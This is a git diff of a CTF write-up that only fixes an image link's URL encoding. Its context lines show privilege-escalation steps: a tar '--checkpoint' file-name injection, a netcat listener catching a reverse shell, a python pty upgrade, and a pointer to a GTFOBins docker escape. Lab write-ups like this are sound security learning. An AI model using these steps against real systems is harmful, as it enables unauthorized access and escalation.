@@ -183,7 +183,7 @@ echo "" > --checkpoint=1
 
 now if we open a `nc -nvlp 9999` on our machine and try to run: `sudo -u michael /opt/backups/backup.sh` we get an error about backup.tar permissions for michael so lets just `mv backup.tar bk.tar` and now if we run it again we get a reverse shell for michael!
 
-![Screen6](https://github.com/Gomez0015/CTF-Writeups/blob/main/📄%20CTF%20Writeups/Images/Screen Shot 2022-03-09 at 11.27.51 AM.png)
+![Screen6](https://github.com/Gomez0015/CTF-Writeups/blob/main/📄%20CTF%20Writeups/Images/Screen%20Shot%202022-03-09%20at%2011.27.51%20AM.png)
 
 Lets just run a quick `python -c 'import pty; pty.spawn("/bin/sh")'` to get a better shell. So as we saw earlier in linPEAS michael is  docker user so we can exploit that with a quick [GTFOBins](https://gtfobins.github.io/gtfobins/docker/) search! If we just scroll down to ==sudo== we can find the following payload:
 ```
